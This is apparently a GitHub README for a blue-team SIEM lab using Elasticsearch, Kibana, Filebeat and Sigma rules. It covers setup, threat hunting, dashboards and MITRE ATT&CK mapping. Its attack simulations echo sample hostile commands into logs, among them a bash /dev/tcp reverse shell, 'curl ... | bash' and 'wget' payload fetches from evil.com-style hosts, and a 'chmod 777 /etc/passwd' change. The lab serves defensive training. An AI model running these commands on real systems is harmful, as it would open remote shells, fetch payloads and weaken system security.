qWTRMUzQ0TXpndU1Ua3RMakl3TVM0ek9DMHVNek0yTGpZMk15MHVNek0yZW0wM0xqRTFPUzA1TGpBM05HTXRMalF6TlM0eU1ERXRMamswTlM0MU16VXRNUzQwT0RndU5UTTFMUzQxTkRJZ01DMHVPVGN0TGpJMk55MHhMakk0TFM0ME5qWXRMakUxTkMwdU1UTTBMUzR5T0MwdU1qWTRMUzR6TnpNdExqTXpOUzB1TVRZMExTNHhNelF0TGpFME5DMHVNek16TFM0d056UXRMak16TXk0eE1Ea3VNREUyTGpFeU9TNHhNelF1TVRrNUxqSXVNRGsyTGpBMk5pNHlNVFV1TWk0ek5pNHpNek11TWpreUxqSXVOamd1TkRZM0lERXVNVFkzTGpRMk55NDBPRFVnTUNBeExqQTFNeTB1TWpZM0lERXVNems0TFM0ME5qWXVNVGsxTFM0eE16VXVORFExTFM0ek16UXVOalE0TFM0ME5qY3VNVFUyTFM0eE16WXVNVFE1TFM0eU5qY3VNamM1TFM0eU5qY3VNVEk0TGpBeE5pNHdNelF1TVRNMExTNHhORGN1TXpNeVlUZ3VNRGszSURndU1EazNJREFnTURFdExqWTVMalEyT0hwdExURXVNRGd5TFRFdU5UZ3pWalV1TmpSakxTNHdNRFl0TGpBeUxqQXhNeTB1TURReUxqQXlPUzB1TURVdU1EYzBMUzR3TkRNdU1UZ3RMakF5Tnk0eU5pNHdNRFF1TURZeklEQWdMakUyTGpBMk55NHhOUzR4TXpVdExqQXdOaTR3TkRrdExqQTROUzR3TmpZdExqRXpOUzR3TmpZdExqQTFOU0F3TFM0d09USXRMakEwTXkwdU1UUXhMUzR3TmpndExqQTFNaTB1TURFNExTNHhORFl0TGpBd09DMHVNVFl6TFM0d05qVjZiUzB1TlRVeElEQmpMUzR3TWk0d05UZ3RMakV4TXk0d05Ea3RMakUyTmk0d05qWXRMakEwTnk0d01qVXRMakE0Tmk0d05qZ3RMakUwTGpBMk9DMHVNRFVnTUMwdU1UTXRMakF5TFM0eE16WXRMakEyT0MwdU1ERXRMakEyTmk0d09EZ3RMakV6TXk0eE5TMHVNVE16TGpBNExTNHdNekV1TVRnMExTNHdORGN1TWpVNUxTNHdNRFV1TURFNUxqQXdPUzR3TXpZdU1ETXVNRE11TURWMkxqQXlhQzR3TURONklpOCtQQzl6ZG1jKyIvPjx0ZXh0IHRyYW5zZm9ybT0ic2NhbGUoLjEpIiB4PSI0NzYuMjUiIHk9IjE3NSIgdGV4dExlbmd0aD0iMzcyLjUiIGZpbGw9IiNmZmYiPkxJTlVYPC90ZXh0Pjx0ZXh0IHRyYW5zZm9ybT0ic2NhbGUoLjEpIiB4PSIxMDYyLjUiIHk9IjE3NSIgdGV4dExlbmd0aD0iMzIwIiBmaWxsPSIjZmZmIiBmb250LXdlaWdodD0iYm9sZCI+S0FMSTwvdGV4dD48L2c+PC9zdmc+ "Linux")  
![](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNzkiIGhlaWdodD0iMjgiIHJvbGU9ImltZyIgYXJpYS1sYWJlbD0iUFJPSkVDVDogQ09NUExFVEVEIj48dGl0bGU+UFJPSkVDVDogQ09NUExFVEVEPC90aXRsZT48ZyBzaGFwZS1yZW5kZXJpbmc9ImNyaXNwRWRnZXMiPjxyZWN0IHdpZHRoPSI3Ni43NSIgaGVpZ2h0PSIyOCIgZmlsbD0iIzU1NSIvPjxyZWN0IHg9Ijc2Ljc1IiB3aWR0aD0iMTAyLjI1IiBoZWlnaHQ9IjI4IiBmaWxsPSIjNGIwIi8+PC9nPjxnIGZpbGw9IiNmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtZmFtaWx5PSJWZXJkYW5hLEdlbmV2YSxEZWphVnUgU2FucyxzYW5zLXNlcmlmIiB0ZXh0LXJlbmRlcmluZz0iZ2VvbWV0cmljUHJlY2lzaW9uIiBmb250LXNpemU9IjEwMCI+PHRleHQgdHJhbnNmb3JtPSJzY2FsZSguMSkiIHg9IjM4My43NSIgeT0iMTc1IiB0ZXh0TGVuZ3RoPSI1MjcuNSIgZmlsbD0iI2ZmZiI+UFJPSkVDVDwvdGV4dD48dGV4dCB0cmFuc2Zvcm09InNjYWxlKC4xKSIgeD0iMTI3OC43NSIgeT0iMTc1IiB0ZXh0TGVuZ3RoPSI3ODIuNSIgZmlsbD0iI2ZmZiIgZm9udC13ZWlnaHQ9ImJvbGQiPkNPTVBMRVRFRDwvdGV4dD48L2c+PC9zdmc+ "Status")

### 🚨 End-to-End SIEM • Threat Hunting • Detection Engineering • SOC Monitoring Lab


# 📌 Overview

This project demonstrates the implementation of a complete enterprise-style SIEM (Security Information and Event Management) lab using the **Elastic Stack ecosystem**.

The environment was designed to simulate real-world SOC (Security Operations Center) operations including:

- Centralized log collection

- Threat hunting

- Detection engineering

- Alerting workflows

- Dashboard visualization

- Attack simulation

- Security telemetry analysis

- MITRE ATT&CK mapping

The project integrates:

- **Elasticsearch** for indexing and search

- **Kibana** for dashboards and threat hunting

- **Filebeat** for telemetry collection

- **Sigma rules** for detection engineering

- **Linux/Kali** for attack simulation

# 🎯 Project Objectives

## Primary Goals

✅ Build a working SIEM environment

✅ Collect and analyze system telemetry

✅ Detect suspicious activity using threat hunting techniques

✅ Simulate real-world attacker behavior

✅ Create SOC monitoring dashboards

✅ Configure alert-based detections

✅ Practice detection engineering using Sigma rules

✅ Understand Elastic Stack architecture and workflows


# 🏗️ Architecture

```
`┌────────────────────────────┐`

`│        Attack Simulation   │`

`│  SSH • Nmap • PowerShell   │`

`│ Reverse Shell • Malware    │`

`└──────────────┬─────────────┘`

`               │`

`               ▼`

`┌────────────────────────────┐`

`│         Filebeat           │`

`│  Log Collection & Parsing  │`

`└──────────────┬─────────────┘`

`               │`

`               ▼`

`┌────────────────────────────┐`

`│      Elasticsearch         │`

`│  Indexing & Search Engine  │`

`└──────────────┬─────────────┘`

`               │`

`               ▼`

`┌────────────────────────────┐`

`│          Kibana            │`

`│ Dashboards • Alerts • SOC  │`

`│ Threat Hunting • Discover  │`

`└────────────────────────────┘`
```


# ⚙️ Technologies Used

| **Technology** | **Purpose** |
| :-: | :-: |
| Elasticsearch | Search engine & indexing |
| Kibana | Visualization & threat hunting |
| Filebeat | Log ingestion |
| Sigma Rules | Detection engineering |
| Kali Linux | Attack simulation |
| Git & GitHub | Version control |
| Syslog/Auth Logs | Security telemetry |


# 🚀 Elastic Stack Setup

## 1️⃣ Elasticsearch

### Responsibilities

- Log indexing

- Data storage

- Search processing

- Telemetry analysis

### Service Commands

```
`sudo systemctl start elasticsearch`

`sudo systemctl status elasticsearch`
```

### Health Check

```
`curl -k -u elastic https://localhost:9200`
```


## 2️⃣ Kibana

### Responsibilities

- Dashboard visualization

- Threat hunting

- Alerting

- Discover analysis

### Service Commands

```
`sudo systemctl start kibana`

`sudo systemctl status kibana`
```

### Access URL

```
`http://127.0.0.1:5601`
```


## 3️⃣ Filebeat

### Responsibilities

- Log collection

- Forwarding telemetry

- Monitoring auth/syslog data

### Service Commands

```
`sudo systemctl restart filebeat`

`sudo systemctl status filebeat`
```

### Validation Commands

```
`sudo filebeat test config`

`sudo filebeat test output`
```


# 📂 Monitored Log Sources

## Linux System Logs

```
`/var/log/auth.log`

`/var/log/syslog`
```

## Custom Threat Logs

```
`/tmp/powershell.log`
```


# 🔥 Attack Simulations

This lab includes multiple simulated attack scenarios.


## 🚨 Failed SSH Login Detection

### Simulation

```
`echo "Failed password for root from 10.10.10.10" \>\> /var/log/auth.log`
```

### Detection Goal

- SSH brute-force attempts

- Authentication failures

- Unauthorized login monitoring

### MITRE ATT&CK

```
`T1110 — Brute Force`
```


## 🌐 Nmap Reconnaissance Detection

### Simulation

```
`echo "nmap stealth scan detected" \>\> /tmp/powershell.log`
```

### Detection Goal

- Active scanning detection

- Reconnaissance monitoring

### MITRE ATT&CK

```
`T1595 — Active Scanning`
```


## ⚡ Suspicious PowerShell Detection

### Simulation

```
`echo "powershell.exe encoded command execution" \>\> /tmp/powershell.log`
```

### Detection Goal

- Encoded payload detection

- Script execution monitoring

- Malicious command analysis

### MITRE ATT&CK

```
`T1059.001 — PowerShell`
```


## 🐚 Reverse Shell Detection

### Simulation

```
`echo "bash -i \>& /dev/tcp/10.10.10.10/4444 0\>&1" \>\> /tmp/powershell.log`
```

### Detection Goal

- Reverse shell activity

- C2 communication monitoring

### MITRE ATT&CK

```
`T1059 — Command and Scripting Interpreter`
```


## 📥 Suspicious Download Detection

### Simulations

```
`echo "curl http://malicious-site/payload.sh | bash" \>\> /tmp/powershell.log`

`echo "wget http://evil.com/backdoor.sh" \>\> /tmp/powershell.log`
```

### Detection Goal

- Malware retrieval

- Payload download monitoring

### MITRE ATT&CK

```
`T1105 — Ingress Tool Transfer`
```


## 🔓 Privilege Escalation Simulation

### Simulations

```
`echo "sudo useradd attacker" \>\> /tmp/powershell.log`

`echo "chmod 777 /etc/passwd" \>\> /tmp/powershell.log`
```

### Detection Goal

- Privilege escalation monitoring

- Unauthorized account creation

- Dangerous permission changes

### MITRE ATT&CK

```
`T1136 — Create Account`

`T1222 — File & Directory Permission Modification`
```


# 🧠 Sigma Detection Engineering

Sigma rules were created and validated for suspicious activity detection.

## Sigma Validation

```
`sigma check Week\_2/Workflow/Sigma-Rules/powershell-detection.yml`
```

## Detection Coverage

- PowerShell encoded commands

- Reverse shell indicators

- Suspicious Linux activity

- Malware download behavior


# 🔎 Threat Hunting Workflow

Threat hunting activities were performed inside Kibana Discover.

## Example Queries

| **Query** | **Purpose** |
| :-: | :-: |
| Failed password | SSH brute-force detection |
| nmap | Reconnaissance hunting |
| powershell.exe | PowerShell abuse hunting |
| curl | Malware download analysis |
| wget | Payload retrieval hunting |
| /dev/tcp/ | Reverse shell hunting |
| chmod 777 | Privilege escalation hunting |


# 📊 Dashboard Development

A SOC-style monitoring dashboard was developed in Kibana.

## Dashboard Panels

### 🔹 Failed Login Timeline

Tracks authentication failures over time.

### 🔹 Nmap Recon Activity

Visualizes reconnaissance attempts and scan behavior.

### 🔹 PowerShell Threat Activity

Monitors suspicious PowerShell execution.

### 🔹 Reverse Shell Detection

Tracks possible command-and-control behavior.

### 🔹 Malware Download Monitoring

Detects curl/wget payload retrieval attempts.


# 🚨 Alerting & Detection Rules

Kibana alert rules were configured for:

- Failed logins

- Nmap scans

- PowerShell abuse

- Reverse shells

- Suspicious downloads

## Alert Features

✅ Real-time monitoring

✅ Query-based detections

✅ Scheduled execution

✅ Threshold-based alerting


# 🛠️ Problems Faced & Solutions

| **Problem** | **Solution** |
| :-: | :-: |
| Filebeat YAML errors | Corrected indentation & syntax |
| Elasticsearch authentication failures | Updated credentials in filebeat.yml |
| Logs not visible in Kibana | Expanded time range & restarted Filebeat |
| Alerting encryption issue | Configured Kibana encryption keys |
| Filebeat ingestion delays | Validated indices & restarted services |


# 📈 Project Outcomes

Successfully achieved:

✅ Complete SIEM deployment

✅ Threat telemetry ingestion

✅ Threat hunting implementation

✅ Detection engineering practice

✅ Dashboard visualization

✅ Alert-based monitoring

✅ MITRE ATT&CK mapping

✅ SOC workflow simulation


# 🧪 Skills Demonstrated

## Blue Team Skills

- Threat Hunting

- Log Analysis

- Detection Engineering

- SOC Monitoring

- Security Analytics

- SIEM Administration

## Technical Skills

- Elasticsearch

- Kibana

- Filebeat

- Sigma Rules

- Linux Logging

- YAML Configuration

- Detection Query Writing


# 📸 Screenshots

## Suggested Screenshots

Add screenshots inside the `/Screenshots` directory:

```
`Screenshots/`

`├── elasticsearch-running.png`

`├── kibana-dashboard.png`

`├── filebeat-status.png`

`├── sigma-validation.png`

`├── failed-login-detection.png`

`├── nmap-detection.png`

`├── powershell-detection.png`

`├── reverse-shell-detection.png`

`├── alert-rule.png`

`└── final-dashboard.png`
```


# 📁 Project Structure

```
`cyart-red-teaming/`

`│`

`├── Week 2/`

`│`

`├── Documentation/`

`├── Reports/`

`├── Screenshots/`

`├── Workflow/`

`├── Sigma-Rules/`

`│`

`├── README.md`

`└── Final-Report.md`
```


# 🔮 Future Improvements

Future enhancements planned:

- Wazuh integration

- Suricata IDS integration

- Threat intelligence feeds

- SOAR automation

- Email/Slack alerting

- Advanced Sigma coverage

- Machine learning anomaly detection

- Endpoint telemetry integration


# 📚 Learning Outcomes

This project provided practical understanding of:

- Enterprise SIEM operations

- SOC monitoring workflows

- Detection engineering concepts

- Threat hunting methodologies

- Security telemetry analysis

- Elastic Stack architecture


# 👨💻 Author

## Siddheshwar Sarate 

### Cybersecurity • Threat Hunting • Detection Engineering • SIEM


# ⭐ Repository Goals

This repository is designed for:

- Cybersecurity learning

- SOC analyst practice

- Threat hunting labs

- SIEM implementation training

- Detection engineering practice

- Elastic Stack experimentation


# 📌 Final Note

This project demonstrates a practical, real-world implementation of:

✅ SIEM deployment

✅ Threat detection

✅ Telemetry analysis

✅ SOC monitoring

✅ Detection engineering

✅ Attack simulation

✅ Kibana threat hunting

It represents foundational hands-on experience required for modern cybersecurity operations and SOC analyst workflows.

# ⭐ If you found this project useful, consider starring the repository ⭐

